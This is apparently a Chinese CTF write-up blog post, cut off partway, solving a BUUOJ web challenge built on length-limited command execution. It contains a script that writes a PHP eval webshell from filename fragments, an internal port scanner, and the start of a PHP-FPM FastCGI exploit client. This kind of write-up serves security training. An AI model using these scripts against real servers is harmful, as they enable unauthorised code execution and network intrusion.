@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="这题是CTF学习交流群（473831530）的入群题。上来就给了源码啊。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ刷题-Web-ctf473831530_2018_web_virink_web">
+<meta property="og:url" content="http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="这题是CTF学习交流群（473831530）的入群题。上来就给了源码啊。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/php-fpm.png">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/rsync.png">
+<meta property="article:published_time" content="2019-09-09T04:21:12.000Z">
+<meta property="article:modified_time" content="2019-12-10T12:15:12.596Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="BUUOJ">
+<meta property="article:tag" content="Shell">
+<meta property="article:tag" content="PHP-FPM">
+<meta property="article:tag" content="RSync">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/php-fpm.png">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUOJ刷题-Web-ctf473831530_2018_web_virink_web | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUOJ刷题-Web-ctf473831530_2018_web_virink_web
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-09-09 12:21:12" itemprop="dateCreated datePublished" datetime="2019-09-09T12:21:12+08:00">2019-09-09</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2019-12-10 20:15:12" itemprop="dateModified" datetime="2019-12-10T20:15:12+08:00">2019-12-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>10k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>这题是CTF学习交流群（473831530）的入群题。上来就给了源码啊。 <a id="more"></a> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="string">&#x27;orange&#x27;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">20</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; IP : &#123;\$_SERVER[&#x27;REMOTE_ADDR&#x27;]&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>20个字符的命令执行，而且要跨机器操作，我们是一定需要一个Webshell的。可是写不进去。参考<a href="%5Bhttps://blog.wonderkun.cc/2017/02/09/%E4%BB%8E%E4%B8%83%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0GetShell/%5D(https://blog.wonderkun.cc/2017/02/09/从七个字符长度的任意命令执行到GetShell/)">这个</a>和<a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge">这个</a>，我们思路就明确了：利用<code>1=&gt;filename</code>的特性创建特殊的文件，然后<code>ls -tr</code>列文件拼出完整的shell。ls -tr是按照文件创建时间顺序倒序列文件。由于我们的Shell带有大量特殊字符，考虑转义的问题，我们再套一层echo即可。</p>
+<p>即我们要写入的内容是<code>echo '&lt;?php eval($_GET[c]);' &gt; 2.txt</code>，可以拆成如下几段：</p>
+<ul>
+<li><code>echo\ \\</code></li>
+<li><code>\'\&lt;\?php \\</code></li>
+<li><code>eval\(</code></li>
+<li><code>\$_GET\[c\]\)</code></li>
+<li><code>\;\'\&gt;2.txt</code></li>
+</ul>
+<p>每一个文件名中有空格的都需要在行尾加上<code>\\</code>。</p>
+<p>我们来试一下效果： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd2</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="comment"># exec cmd</span></span><br><span class="line">    my_params = &#123;</span><br><span class="line">        <span class="string">&#x27;cmd&#x27;</span>: c</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(base_url, params=my_params)</span><br><span class="line">    print(<span class="string">&#x27;exec cmd2&#x27;</span>, c, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_webshell</span>():</span></span><br><span class="line">    filename = [<span class="string">r&#x27;&gt;echo\ \\&#x27;</span>, <span class="string">r&quot;&gt;\&#x27;\&lt;\?php \\&quot;</span>, <span class="string">r&#x27;&gt;eval\(&#x27;</span>, <span class="string">r&#x27;&gt;\$_GET\[c\]\)&#x27;</span>, <span class="string">r&quot;&gt;\;\&#x27;\&gt;2.php&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">        my_params = &#123;</span><br><span class="line">            <span class="string">&#x27;cmd&#x27;</span>: i</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(base_url, params=my_params)</span><br><span class="line">        print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">    cmd_list = [<span class="string">&#x27;ls -tr&gt;1.sh&#x27;</span>, <span class="string">&#x27;sh 1.sh&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cmd_list:</span><br><span class="line">        exec_cmd2(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    write_webshell()</span><br><span class="line">    print(<span class="string">&#x27;ok&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>访问/sandbox/XXX/2.php即可拿到Shell。我们cat /flag发现是个假的。下一步扫一下内网。Hint中提示我们可以用Python3。然而发现脚本太慢了，我就手动扫了，做题时服务器IP是172.64.152.3，然后发现172.64.152.4有HTTP回应。我们扫端口。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;active_port.txt&#x27;</span>,<span class="string">&#x27;at&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">&#x27;172.64.152.4&#x27;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">&#x27;ok&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后发现80 873 9000端口开放。873对应Rsync，9000对应FPM。我们先试试9000的FPM漏洞。参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">这个</a>。ExP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    </span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = 